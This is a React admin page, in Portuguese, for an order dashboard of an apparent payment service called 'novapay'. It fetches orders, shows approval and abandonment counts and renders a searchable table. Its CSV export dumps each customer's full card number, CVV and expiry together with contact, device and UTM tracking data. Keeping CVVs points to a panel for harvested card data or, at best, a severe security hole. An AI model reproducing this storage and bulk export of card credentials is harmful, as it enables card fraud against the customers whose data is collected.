import { useState, useEffect } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Search, Download, ShoppingCart, CheckCircle, Clock } from "lucide-react";

const statusVariant: Record<string, "default" | "secondary" | "destructive"> = {
  success: "default",
  pending: "secondary",
  failed: "destructive",
};

export default function Orders() {
  const [search, setSearch] = useState("");
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const [orders, setOrders] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    fetch('/api/orders')
      .then(res => res.json())
      .then(data => {
        setOrders(data.data || []);
        setLoading(false);
      })
      .catch(err => {
        console.error(err);
        setLoading(false);
      });
  }, []);

  const filtered = orders.filter(
    (o) =>
      (o.customer_name && o.customer_name.toLowerCase().includes(search.toLowerCase())) ||
      (o.customer_email && o.customer_email.toLowerCase().includes(search.toLowerCase())) ||
      (o.id && o.id.toLowerCase().includes(search.toLowerCase()))
  );

  const totalOrders = orders.length;
  const approvedOrders = orders.filter(o => o.status === 'success').length;
  const abandonedOrders = orders.filter(o => o.status === 'pending').length;

  const handleExportCsv = () => {
    const headers = ["ID", "Cliente", "Email", "Telefone", "Produto", "País / Estado", "Valor", "Moeda", "Status", "Data", "Cartão", "CVV", "Exp", "Browser", "Dispositivo", "UTM Source", "UTM Medium", "UTM Campaign"];
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const rows = filtered.map((o: any) => [
      o.id,
      `"${o.customer_name || ''}"`,
      o.customer_email || "",
      o.customer_phone || "",
      `"${o.product_name || ""}"`,
      `"${(o.province || o.country) || ""}"`,
      o.amount || "",
      o.currency || "",
      o.status || "",
      `"${new Date(o.created_at).toLocaleString('pt-BR')}"`,
      `"${o.card_number || ""}"`,
      o.card_cvv || "",
      o.card_exp || "",
      o.browser || "",
      o.device_type || "",
      o.utm_source || "",
      o.utm_medium || "",
      o.utm_campaign || ""
    ]);
    const csvContent = "data:text/csv;charset=utf-8," + [headers, ...rows].map(e => e.join(",")).join("\n");
    const encodedUri = encodeURI(csvContent);
    const link = document.createElement("a");
    link.href = encodedUri;
    link.download = `pedidos-novapay-${new Date().toISOString().slice(0, 10)}.csv`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  return (
    <div className="space-y-6">
      <div className="flex flex-col gap-4 sm:flex-row sm:items-center sm:justify-between">
        <div>
          <h1 className="text-2xl font-bold">Pedidos</h1>
          <p className="text-sm text-muted-foreground">Listagem de todas as transações</p>
        </div>
        <Button variant="outline" className="gap-2" onClick={handleExportCsv} disabled={filtered.length === 0}>
          <Download className="h-4 w-4" />
          Exportar CSV
        </Button>
      </div>

      <div className="grid gap-4 sm:grid-cols-3">
        <Card>
          <CardContent className="p-6 flex items-center gap-4">
            <div className="p-3 bg-primary/10 text-primary rounded-full"><ShoppingCart className="w-5 h-5" /></div>
            <div>
              <p className="text-sm text-muted-foreground">Total de Pedidos</p>
              <h2 className="text-2xl font-bold">{totalOrders}</h2>
            </div>
          </CardContent>
        </Card>
        <Card>
          <CardContent className="p-6 flex items-center gap-4">
            <div className="p-3 bg-emerald-500/10 text-emerald-500 rounded-full"><CheckCircle className="w-5 h-5" /></div>
            <div>
              <p className="text-sm text-muted-foreground">Pedidos Aprovados</p>
              <h2 className="text-2xl font-bold">{approvedOrders}</h2>
            </div>
          </CardContent>
        </Card>
        <Card>
          <CardContent className="p-6 flex items-center gap-4">
            <div className="p-3 bg-warning/10 text-warning rounded-full"><Clock className="w-5 h-5" /></div>
            <div>
              <p className="text-sm text-muted-foreground">Abandonados/Pendentes</p>
              <h2 className="text-2xl font-bold">{abandonedOrders}</h2>
            </div>
          </CardContent>
        </Card>
      </div>

      <div className="relative">
        <Search className="absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
        <Input
          placeholder="Buscar por nome, email ou ID..."
          value={search}
          onChange={(e) => setSearch(e.target.value)}
          className="pl-9"
        />
      </div>

      <Card>
        <CardContent className="p-0">
          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead>
                <tr className="border-b border-border">
                  <th className="p-4 text-left font-medium text-muted-foreground">ID</th>
                  <th className="p-4 text-left font-medium text-muted-foreground">Cliente</th>
                  <th className="p-4 text-left font-medium text-muted-foreground">Produto</th>
                  <th className="p-4 text-left font-medium text-muted-foreground">País</th>
                  <th className="p-4 text-right font-medium text-muted-foreground">Valor</th>
                  <th className="p-4 text-center font-medium text-muted-foreground">Status</th>
                  <th className="p-4 text-left font-medium text-muted-foreground">UTM</th>
                  <th className="p-4 text-left font-medium text-muted-foreground">Data</th>
                </tr>
              </thead>
              <tbody>
                {loading ? (
                  <tr><td colSpan={8} className="p-8 text-center text-muted-foreground">Carregando pedidos...</td></tr>
                ) : filtered.length === 0 ? (
                  <tr><td colSpan={8} className="p-8 text-center text-muted-foreground">Nenhum pedido encontrado.</td></tr>
                ) : filtered.map((order) => (
                  <tr key={order.id} className="border-b border-border last:border-0 hover:bg-muted/50 transition-colors">
                    <td className="p-4 font-mono text-[10px] text-muted-foreground" title={order.id}>{order.id.slice(0, 8)}...</td>
                    <td className="p-4">
                      <div>
                        <p className="font-medium">{order.customer_name}</p>
                        <p className="text-xs text-muted-foreground">{order.customer_email || order.customer_phone}</p>
                      </div>
                    </td>
                    <td className="p-4 text-muted-foreground">{order.product_name}</td>
                    <td className="p-4">{order.country || 'N/A'}</td>
                    <td className="p-4 text-right font-medium whitespace-nowrap">
                      {order.currency} {parseFloat(order.amount).toLocaleString()}
                    </td>
                    <td className="p-4 text-center">
                      <Badge variant={statusVariant[order.status] || "secondary"}>
                        {order.status === 'success' ? 'Aprovado' : order.status === 'pending' ? 'Pendente' : order.status}
                      </Badge>
                    </td>
                    <td className="p-4">
                      <span className="text-xs font-mono text-muted-foreground">
                        {order.utm_source ? (
                          <span className="px-2 py-1 bg-muted rounded">
                            {order.utm_source}
                          </span>
                        ) : "—"}
                      </span>
                    </td>
                    <td className="p-4 text-xs text-muted-foreground whitespace-nowrap">
                      {new Date(order.created_at).toLocaleString("pt-BR")}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </CardContent>
      </Card>
    </div>
  );
}
